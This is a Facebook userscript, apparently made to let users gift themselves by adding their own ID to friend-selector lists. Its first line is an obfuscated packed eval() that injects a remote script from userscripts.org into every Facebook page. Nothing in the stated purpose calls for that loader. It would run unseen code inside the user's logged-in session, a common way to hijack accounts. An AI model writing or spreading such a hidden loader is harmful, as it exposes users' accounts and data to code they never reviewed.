// ==UserScript==
// @name           Facebook gift myself Plus
// @author         frank38
// @version        1.0
// @namespace      
// @description    Facebook gift myself
// @require        http://jqueryjs.googlecode.com/files/jquery-1.3.2.min.js
// @include		   *facebook.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



$(document).ready(function () {
	var fbID;
	try { fbID = unsafeWindow.channelManager.user; }
	catch (x) {	return;	}
	//friend selector 1
	if($("#friends").length) {
		htm = "<li userid=\"" + fbID + "\">";
		htm += "<a onclick=\"fs.click(this.parentNode); return false;\" href=\"#\">";
		htm += "<span class=\"square\" style=\"background-image: url(http://static.ak.fbcdn.net/pics/q_silhouette.gif); \"></span/>";
		htm += "</span><strong>* MYSELF *</strong><br/><span class=\"*\"/></a></li>";
		$("#friends").prepend(htm);
	}
	//friend selector 2
	if($(".unselected_list").length) {
		htm1 = "<label class=\"clearfix\">";
		htm1 += "<input id=\"ids[]\" class=\"inputcheckbox\" type=\"checkbox\" fb_protected=\"true\" value=\"" + fbID + "\" name=\"ids[]\"/><span>*** MYSELF *** </span>";
		htm1 += "</label>";
		$(".unselected_list").prepend(htm1);
	}
});

/**********************************************************************/
